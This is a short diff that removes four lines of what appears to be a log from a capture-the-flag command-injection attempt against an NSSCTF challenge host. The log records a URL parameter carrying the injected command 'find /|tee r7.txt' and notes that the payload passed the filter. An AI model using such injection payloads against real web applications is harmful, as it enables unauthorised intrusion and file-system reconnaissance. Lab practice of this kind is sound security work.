@@ -1,4 +1,0 @@
-﻿[>] http://node4.anna.nssctf.cn:27309/?url=find%20%2F%7Ctee%20r7.txt
-[i] decoded: find /|tee r7.txt
-[i] effective response after source dump: 'Can you see anything?'
-[+] exec marker present (payload passed the filter)
